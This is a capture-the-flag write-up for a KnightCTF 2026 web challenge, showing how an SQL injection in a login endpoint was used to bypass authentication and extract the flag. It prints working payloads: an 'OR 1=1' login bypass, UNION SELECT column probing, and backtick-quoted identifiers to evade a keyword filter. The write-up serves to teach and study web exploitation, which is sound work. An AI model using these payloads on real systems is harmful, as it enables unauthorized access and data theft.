# KnightCTF — Admin Panel (SQLi)

**Category:** Web

## Summary
The login endpoint was vulnerable to SQL injection. Using a crafted `UNION SELECT`, I extracted the flag from a separate `flag` table. The filter blocked some keywords (`WHERE`, `information_schema`) and direct access to the `password` column, but backtick-quoted identifiers bypassed the filter.

## Target
- URL: http://50.116.19.213:3000/
- Endpoint: `/login`

## Initial Access (Login Bypass)
The login form accepted injected SQL.
- `username`: `\`
- `password`: `OR 1=1 -- -`

## Column Count
I verified the query returns **2 columns** by testing a union:
- `password`: `UNION SELECT 1,2 -- -`

The response rendered the first column in the “Hello, …” slot, which confirmed the first column is reflected.

## Filter Evasion
Direct `WHERE` and `information_schema` usage were blocked. Using backtick-quoted identifiers for table and column names allowed access to blocked columns:

```
UNION SELECT `password`,2 FROM `users` LIMIT 1,1 -- -
```

This returned a value (`1337`) in the username slot, confirming column access.

## Discover Database Name
To guide enumeration, I retrieved the current database name:

```
UNION SELECT database(),2 -- -
```

Result: `chall`

## Flag Extraction
I guessed a common flag table name and tested columns. `flag.value` was accessible:

```
UNION SELECT value,2 FROM flag -- -
```

**Flag:** `KCTF{0c259a70a089442a7e622d02bb5d911f}`

## Notes
- The endpoint reflected only the first union column, so all sensitive data had to be projected into column 1.
- Some filters caused `400`/`500` responses; backticks and simple unions were reliable.

## Final Payload Used
```
username = \
password = UNION SELECT value,2 FROM flag -- -
```
---

**Author:** MR. Umair   
**Date:** January 20, 2026  
**Competition:** KnightCTF 2026